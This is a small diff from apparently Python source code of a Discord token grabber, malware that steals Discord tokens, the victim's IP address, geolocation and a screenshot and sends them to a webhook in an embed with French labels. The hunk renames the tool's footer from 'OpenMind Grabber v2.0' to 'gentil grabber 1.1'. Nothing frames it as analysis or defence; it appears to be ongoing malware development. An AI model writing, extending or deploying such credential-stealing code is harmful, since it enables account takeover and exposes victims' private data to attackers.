@@ -244,7 +244,7 @@ def send_to_webhook(tokens, ip, geo, screenshot_path):
                 {"name": "📍 Géolocalisation", "value": f"`{geo}`", "inline": True},
                 {"name": "🎟️ Tokens Discord", "value": f"```{chr(10).join(tokens[:5])}```" if tokens else "Aucun token trouvé", "inline": False}
             ],
-            "footer": {"text": "OpenMind Grabber v2.0"}
+            "footer": {"text": "gentil grabber 1.1"}
         }]
     }
     try:
